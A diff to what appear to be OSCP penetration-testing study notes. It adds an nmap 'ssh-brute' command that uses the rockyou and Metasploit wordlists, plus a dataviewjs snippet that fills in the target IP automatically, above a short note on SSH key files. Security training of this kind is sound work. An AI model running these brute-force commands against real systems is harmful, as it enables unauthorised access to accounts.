@@ -1,3 +1,14 @@
+nmap -p 22 --script ssh-brute \
+  --script-args userdb=/usr/share/wordlists/metasploit/namelist.txt,passdb=/usr/share/wordlists/rockyou.txt \
+  192.168.X.X
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `nmap -p 22 --script ssh-brute --script-args userdb=/usr/share/wordlists/metasploit/namelist.txt,passdb=/usr/share/wordlists/rockyou.txt ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 - `id_rsa` is the private key that should be kept secret and never shared
     
 - `id_rsa.pub` is the public key that can be shared with other systems
